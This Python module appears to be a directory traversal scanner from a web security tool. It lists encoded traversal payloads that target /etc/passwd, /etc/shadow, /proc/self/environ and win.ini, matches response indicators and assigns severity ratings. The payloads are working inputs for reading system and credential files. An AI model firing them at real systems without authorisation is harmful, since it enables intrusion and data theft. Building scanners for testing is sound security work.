"""Directory traversal detection scanner (enhanced)."""

from web_scanner.scanner import BaseScanner

# Linux / generic traversal payloads
LINUX_PAYLOADS = [
    "../../../../etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//....//etc/passwd",
    "../../../../../../etc/hosts",
    "..%2f..%2f..%2f..%2fproc%2fself%2fenviron",
    "/etc/shadow",
    "/proc/self/cmdline",
    "/proc/self/environ",
    "../../etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd%00",           # null byte
    "....//....//....//etc/passwd%00",           # null byte bypass
]

# Null byte injection payloads (bypasses some extension checks)
NULL_BYTE_PAYLOADS = [
    "../../../../etc/passwd%00",
    "../../../../etc/passwd%00.jpg",
    "..%2f..%2f..%2fetc%2fpasswd%00",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00",
    "..\\..\\..\\..\\etc\\passwd%00",
]

# Double / triple URL encoding bypasses
DOUBLE_ENCODED_PAYLOADS = [
    "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    "%252e%252e%255c%252e%252e%255cetc%255cpasswd",
    "%25252e%25252e%25252f%25252e%25252e%25252fetpasswd",  # triple
]

# UTF-8 encoding bypasses (some servers decode non-canonical UTF-8)
UTF8_PAYLOADS = [
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",     # overlong seq
    "..%255c..%255c..%255cetc%255cpasswd",
    "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",        # %c0%ae decodes to .
    "..%%32f..%%32f..%%32fetc%%32fpasswd",           # double %
]

# Windows-specific paths
WINDOWS_PAYLOADS = [
    "..\\..\\..\\..\\windows\\win.ini",
    "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
    "....\\\\....\\\\....\\\\....\\\\windows\\\\win.ini",
    "..%5c..%5c..%5c..%5cboot.ini%00",
    "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "..%5c..%5c..%5c..%5cwindows%5cwin.ini%00",
    "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
    "C:\\windows\\win.ini",
    "C:/windows/win.ini",
]

# All payloads combined
ALL_TRAVERSAL_PAYLOADS = (
    LINUX_PAYLOADS
    + NULL_BYTE_PAYLOADS
    + DOUBLE_ENCODED_PAYLOADS
    + UTF8_PAYLOADS
    + WINDOWS_PAYLOADS
)

# Response content indicators
TRAVERSAL_INDICATORS = [
    "root:x:0:0",       # /etc/passwd
    "daemon:x:",        # /etc/passwd
    "[fonts]",          # windows/win.ini
    "[extensions]",     # windows/win.ini
    "root:",            # /etc/shadow or passwd
    "127.0.0.1",        # /etc/hosts
    "PATH=",            # /proc/self/environ
    "[boot loader]",    # boot.ini
    "for 16-bit app",   # win.ini
    "boot loader",      # boot.ini
]


class PathTraversalScanner(BaseScanner):
    """Detect local/remote file inclusion and directory traversal."""

    def run(self) -> list[dict]:
        findings: list[dict] = []

        resp = self.client.get("/")
        if resp is None:
            return findings

        # Extract params that might accept file paths
        test_params = self._extract_params(resp.text)
        test_params = test_params if test_params else [
            "file", "page", "path", "include", "load", "doc", "dir", "folder",
        ]

        seen_titles = set()

        for param in test_params:
            for payload in ALL_TRAVERSAL_PAYLOADS:
                resp = self.client.get(f"?{param}={payload}")
                if resp is None:
                    continue

                for indicator in TRAVERSAL_INDICATORS:
                    if indicator.lower() in resp.text.lower():
                        title = f"Directory traversal via '{param}'"
                        dedup = (param, indicator, title)
                        if dedup not in seen_titles:
                            seen_titles.add(dedup)
                            severity = self._classify_severity(payload)
                            findings.append({
                                "severity": severity,
                                "title": title,
                                "detail": (
                                    f"File content detected (indicator: "
                                    f"'{indicator}') — payload: {payload[:50]}..."
                                ),
                            })
                        break

        return findings

    # -- helpers -----------------------------------------------------------

    def _classify_severity(self, payload: str) -> str:
        """Assign severity based on the targeted file."""
        critical_targets = ["shadow", "boot.ini", "environ", "cmdline"]
        high_targets = ["passwd", "hosts", "win.ini", "credentials"]
        for t in critical_targets:
            if t in payload.lower():
                return "CRITICAL"
        for t in high_targets:
            if t in payload.lower():
                return "HIGH"
        return "MEDIUM"

    def _extract_params(self, html: str) -> list[str]:
        params = set()
        try:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(html, "html.parser")
            for form in soup.find_all("form"):
                for inp in form.find_all(["input", "select", "textarea"]):
                    name = inp.get("name")
                    if name:
                        params.add(name)
        except Exception:
            pass
        return list(params)
